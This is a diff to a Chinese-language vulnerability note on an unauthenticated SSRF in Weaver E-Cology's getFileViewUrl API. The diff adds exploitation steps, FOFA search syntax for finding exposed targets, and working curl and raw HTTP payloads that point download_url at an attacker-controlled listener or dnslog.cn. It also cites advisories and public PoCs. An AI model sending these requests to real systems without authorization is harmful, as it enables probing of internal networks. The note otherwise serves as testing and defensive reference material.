@@ -25,12 +25,38 @@ fingerprint: ["泛微", "weaver", "E-Cology", "ecology", "getFileViewUrl"]
 - 目标为暴露在外的泛微 E-Cology
 - 官方通告确认未经身份验证即可利用
 
+## 利用步骤
+
+1. 识别目标为泛微 E-Cology（登录页特征；资产测绘 FOFA: app="泛微-OA（e-cology）"）
+2. 未认证向 `/api/doc/mobile/fileview/getFileViewUrl` 发送 JSON POST 请求
+3. 在 `download_url` 字段填入你控制的监听地址（公开 PoC 使用 DNSLog 外带）
+4. 若监听地址收到来自目标服务器的请求，则存在 SSRF
+
+## Payload
+
+```bash
+curl -s -X POST "http://target/api/doc/mobile/fileview/getFileViewUrl" \
+  -H "Content-Type: application/json" \
+  -d '{"file_id":"1000","file_name":"c","download_url":"http://<你控制的监听地址>/ssrf"}'
+```
+
+公开来源原始请求：
+
+```http
+POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
+Host: your-ip
+Content-Type: application/json
+
+{"file_id":"1000","file_name":"c","download_url":"http://dnslog.cn"}
+```
+
 ## 验证方法
 
 ```bash
-# 仅限授权测试：向 getFileViewUrl 接口传入可控 url 参数，观察是否产生外连/内网请求
-# 不同版本接口参数略有差异，先在授权范围内确认接口存在与参数格式
-curl -s "http://target/<ecology路径>/getFileViewUrl?url=http://<你控制的监听地址>/x"
+# 仅限授权测试：向 download_url 填入自己控制的监听地址，观察是否产生外连/内网请求
+curl -s -X POST "http://target/api/doc/mobile/fileview/getFileViewUrl" \
+  -H "Content-Type: application/json" \
+  -d '{"file_id":"1000","file_name":"c","download_url":"http://<你控制的监听地址>/x"}'
 # 若监听地址收到来自目标服务器的请求，则存在 SSRF
 ```
 
@@ -50,3 +76,6 @@ curl -s "http://target/" | grep -iE "weaver|ecology|泛微"
 
 - 泛微安全更新提醒: https://www.weaver.com.cn/cs/security/edm20240607_kdielfrovkewpiiuyrtewtw.html
 - 上海科技大学风险提示: https://it.shanghaitech.edu.cn/2024/0722/c8406a1099322/page.htm
+- 公开 PoC（某微E-Cology getFileViewUrl SSRF 漏洞复现）: https://mp.weixin.qq.com/s/j7t2jgwUfEYHKYoj7tOPCA
+- 斗象应急响应团队通告: https://vip.tophant.com/detail/1811329332556206080
+- 腾讯云开发者（UzzzzZ 文章）: https://cloud.tencent.com.cn/developer/article/2435717
